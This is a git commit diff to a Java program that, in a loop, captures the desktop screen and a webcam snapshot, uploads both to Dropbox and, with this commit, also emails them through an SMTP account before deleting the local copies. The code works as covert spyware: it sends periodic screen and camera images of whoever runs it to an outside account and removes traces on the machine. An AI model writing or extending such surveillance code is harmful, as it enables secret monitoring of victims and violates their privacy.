fa03d68ea80e6b3f325c5af42fd64afbe6a4f75c
ncr00t <geritix@mail.ru>
2019-01-28 13:06:30 +0300

    added sending by email

--- src/main/java/com/company/screenshot/thread/ScreenshotThread.java
+++ src/main/java/com/company/screenshot/thread/ScreenshotThread.java
@@ -1,8 +1,11 @@
 package com.company.screenshot.thread;
 
 import com.company.screenshot.cloud_loader.DropboxUploader;
+import com.company.screenshot.email_sender.EmailSender;
+import com.company.screenshot.file_manager.FileManager;
 import com.company.screenshot.name_generator.ScreenshotNameGenerator;
 import com.company.screenshot.screenshot_maker.ScreenshotMaker;
+import com.company.screenshot.snapshot_webcam_maker.SnapshotWebcamMaker;
 
 import java.awt.image.BufferedImage;
 
@@ -23,19 +26,35 @@ public class ScreenshotThread extends Thread{
                 ScreenshotNameGenerator screenshotNameGenerator = new ScreenshotNameGenerator().setDatePattern("YYYYMMdd_HHmmss")
                                                                                                .setExtension("png");
 
+                FileManager fileManager = new FileManager();
 
-                ScreenshotMaker screenshotMaker = new ScreenshotMaker();
-                BufferedImage imageFromScreen = screenshotMaker.makeScreenshotFromScreen();
-                BufferedImage imageFromWebcam = screenshotMaker.makeScreenshotFromWebCam();
+                EmailSender emailSender = new EmailSender();
+                emailSender.setHost("smtp.mail.ru");
+                emailSender.setFrom("Enter your email");
+                emailSender.setTo("Enter email receiver");
+                emailSender.setUsername("Enter your email");
+                emailSender.setPassword("Enter password your email");
 
-                String accessToken = "insert your token for Dropbox";
+                String accessToken = "Enter your token";
                 DropboxUploader dropboxUploader = new DropboxUploader(accessToken);
 
+                ScreenshotMaker screenshotMaker = new ScreenshotMaker();
+                BufferedImage screenshotFromScreen = screenshotMaker.makeScreenshotFromScreen();
                 screenshotNameGenerator.setScreenshotName("desktop");
-                dropboxUploader.uploadScreenshot(imageFromScreen, screenshotNameGenerator);
+                dropboxUploader.uploadScreenshot(screenshotFromScreen, screenshotNameGenerator);
+                String pathToScreenshotFromDesktop = fileManager.saveScreenshotFromScreenInDirectory(fileManager.getHomeDirectory(),
+                                                                                                     screenshotMaker, screenshotNameGenerator);
+                emailSender.sendScreenshot(pathToScreenshotFromDesktop);
+                fileManager.deleteFile(pathToScreenshotFromDesktop);
 
+                SnapshotWebcamMaker snapshotWebcamMaker = new SnapshotWebcamMaker();
+                BufferedImage snapshotFromWebcam = snapshotWebcamMaker.makeSnapshotFromWebCam();
                 screenshotNameGenerator.setScreenshotName("webcam");
-                dropboxUploader.uploadScreenshot(imageFromWebcam, screenshotNameGenerator);
+                dropboxUploader.uploadScreenshot(snapshotFromWebcam, screenshotNameGenerator);
+                String pathToImageFromWebcam = fileManager.saveSnapshotFromWebcamInDirectory(fileManager.getHomeDirectory(),
+                                                                                                 snapshotWebcamMaker, screenshotNameGenerator);
+                emailSender.sendScreenshot(pathToImageFromWebcam);
+                fileManager.deleteFile(pathToImageFromWebcam);
 
                 sleep(sendingDelayInMilliseconds);
 
